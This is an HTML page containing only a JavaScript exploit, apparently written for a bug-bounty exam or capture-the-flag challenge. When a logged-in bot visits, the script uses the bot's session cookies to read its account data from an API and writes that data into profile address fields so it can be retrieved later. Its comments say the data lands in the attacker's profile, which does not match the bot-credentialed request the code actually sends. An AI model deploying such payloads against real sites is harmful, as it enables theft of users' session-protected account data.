<!DOCTYPE html>
<html>
<body>
    <script>
        const api = "https://api-bugbounty-exam.hashacademy.co/api";
        
        async function internalExploit() {
            try {
                // 1. Bot fetches the flag (usually in its own profile)
                const res = await fetch(api + "/auth/me", { credentials: "include" });
                const data = await res.json();
                
                // Convert the bot's data to a string (this likely contains the flag)
                const flagData = JSON.stringify(data);

                // 2. Bot "helps" you by updating YOUR profile with ITS data
                // We use your ID/Profile endpoint to save the flag where you can read it
                await fetch(api + "/auth/profile", {
                    method: "PATCH",
                    headers: { "Content-Type": "application/json" },
                    credentials: "include",
                    body: JSON.stringify({
                        "fullName": "FLAG_IS_HERE",
                        "address": {
                            "street": flagData.substring(0, 100), // First part of the flag
                            "city": flagData.substring(100, 200), // Second part
                            "state": "LB",
                            "zipCode": "12345",
                            "country": "Lebanon"
                        }
                    })
                });
            } catch (e) {}
        }
        internalExploit();
    </script>
</body>
</html>
